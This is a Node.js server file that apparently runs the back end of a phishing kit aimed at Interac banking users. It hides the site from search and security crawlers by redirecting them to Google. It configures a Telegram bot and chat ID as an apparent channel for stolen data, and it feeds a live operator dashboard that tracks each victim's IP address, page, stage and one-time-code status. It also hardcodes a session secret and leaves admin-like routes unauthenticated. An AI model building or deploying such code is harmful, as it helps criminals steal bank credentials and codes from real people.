// ====================
// Module Imports
// ====================
const express = require('express');
const { createServer } = require('node:http');
const bodyParser = require('body-parser');
const { join } = require('node:path');
const { Server } = require('socket.io');
const fs = require('fs');
let fetch;
const https = require('https');
const http = require(`http`);
const TelegramBot = require('node-telegram-bot-api');
const session = require('express-session');
const crypto = require('crypto');
const sessionStore = new Map();
const redisClient = require('./redisClient');
const { error } = require('node:console');



(async () => {
    fetch = (await import('node-fetch')).default;
})();

require('dotenv').config();

// ====================
// Configuration
// ====================
const app = express();

const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY;
const token = process.env.TELEGRAM_BOT_API_KEY;
const chatId = process.env.TELEGRAM_CHAT_ID;
const adminKey = process.env.ADMIN_KEY;
const bot = new TelegramBot(token, { polling: true });

// EJS setup
app.set('view engine', 'ejs');


// Configure session middleware
app.use(session({
    secret: "6LdI0PYoAAAAAN0RS1L3WZhLYqr8YX3jCwM2umEx", // replace with your secret key
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

const server = createServer(app);
const io = new Server(server);

const botList = [
    'Googlebot',
    'googlebot-image',
    'googlebot-mobile',
    'MSNBot',
    'Slurp',
    'Teoma',
    'Gigabot',
    'Robozilla',
    'Nutch',
    'ia_archiver',
    'archive.org_bot',
    'baiduspider',
    'naverbot',
    'yeti',
    'yahoo-mmcrawler',
    'psbot',
    'yahoo-blogs/v3.9',
    'AhrefsBot',
    'MJ12bot',
    'Majestic-12',
    'Majestic-SEO',
    'DSearch',
    'Rogerbot',
    'SemrushBot',
    'BLEXBot',
    'ScoutJet',
    'SearchmetricsBot',
    'BacklinkCrawler',
    'Exabot',
    'spbot',
    'linkdexbot',
    'Lipperhey Spider',
    'SEOkicks-Robot',
    'sistrix',
    // ... Add all the bots from your list
];

const redirectBots = (req, res, next) => {
    const userAgent = req.get('User-Agent');
    if (userAgent) {
        const isBot = botList.some(botUserAgent => userAgent.includes(botUserAgent));
        if (isBot) {
            return res.redirect('https://www.google.com');
        }
    }
    next();
};

const checkAdminSession = (req, res, next) => {

    if (req.session.isAdminVerified) {
        next();
    } else {
        res.render('misc/403/index');
    }
};

// Middleware to verify Admin response
const verifyAdmin = (req, res, next) => {

    const adminKeyInput = req.body['admin-key'];

    // Check if the provided key matches the stored key
    if (adminKeyInput === adminKey) {
        req.session.isAdminVerified = true;

        next(); // Admin key is correct, proceed to the next middleware/route handler
    } else {
        // Optionally, you could log this attempt or implement rate-limiting to prevent brute force attacks
        res.render('misc/403/index');
    }

};

const checkRecaptchaSession = (req, res, next) => {

    if (req.session.recaptchaVerified) {
        next();
    } else {
        res.status(403).send('Access denied. Please complete the reCAPTCHA.');
    }
};

const verifyRecaptcha = (req, res, next) => {
    const recaptchaResponse = req.body['g-recaptcha-response'];

    // Verify URL
    const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET_KEY}&response=${recaptchaResponse}`;

    fetch(verifyUrl, { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                req.session.recaptchaVerified = true;

                next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
            } else {
                res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
            }
        })
        .catch(error => {
            res.status(500).send('Error in reCAPTCHA verification, try again later.');
        });
};

// Use this middleware in your app before your routes
app.use(redirectBots);


// ====================
// Middleware
// ====================
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.render('captcha/index')
})

app.get('/interac', verifyRecaptcha, (req, res) => {
    res.render('captcha/index')
})

app.post('/update', async (req, res) => {
    let data = req.body;
    console.log(data);

    try { 
        await redisClient.set("settings", JSON.stringify(data));
        res.render('admin/panel/index', { bool: true, message: "Your updates have been successfully saved." });
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error updating data. Contact webcro help.' });
    }
});

app.get('/delete-all', async (req, res) => {
    try {
        await redisClient.flushAll();
        res.render('admin/panel/index', { bool: true, message: "All key delete." });
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error deleting all. Contact webcro help.' });
    }
});



app.get('/admin', (req, res) => {
    if (req.session.isAdminVerified) {
        res.render('admin/panel/index', { bool: false });
    } else {
        res.render('admin/login/index');
    }

});

app.post('/admin/verify', verifyAdmin, (req, res) => {
    res.redirect(301, '/admin/panel');
})

app.get('/admin/panel', checkAdminSession, (req, res) => {
    res.render('admin/panel/index', { bool: false });
})

app.get('/admin/settings', checkAdminSession, async (req, res) => {
    try {
        const keys = await redisClient.keys('*');

        if (keys.length === 0) {
            // Render with a message if no keys are found
            res.render('admin/settings/index', { data: null, message: 'No settings found. Please use the form below to update.' });
            return;
        }

        redisClient.get("settings", (error, settings) => {
            if (error) {console.error(error);};
            if (settings != null){
                let data = JSON.parse(settings)
                res.render('admin/settings/index', { data: data });
            }
        })
        
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error retrieving settings. Contact webcro help.' });
    }
});



// ====================
// Socket Handling
// ====================
io.on('connection', (socket, req) => {
    let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    userIP = userIP.split(',')[0].trim();

    socket.join(userIP);

    if (!sessionStore.has(userIP)) {
        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp: false });
    } else {
        let userDetails = sessionStore.get(userIP);
        userDetails.status = 'actif';
        sessionStore.set(userIP, userDetails);
    }

    io.emit('join', Array.from(sessionStore.entries()));

    socket.on('pageandstage', (data) => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.page = data.page;
            userDetails.stage = data.stage;
            sessionStore.set(userIP, userDetails);
        }
        io.emit('join', Array.from(sessionStore.entries()));
    });

    socket.on('disconnect', () => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.status = 'inactif';
            sessionStore.set(userIP, userDetails);
            io.emit('leave', Array.from(sessionStore.entries()));
        }
    });

    socket.on('deleteAll', () => {
        sessionStore.clear();
        io.emit('join', Array.from(sessionStore.entries()));
    })



});

// ====================
// Server Startup
// ====================

server.listen(80, () => {
    console.log('HTTPS server running on port 80');
});
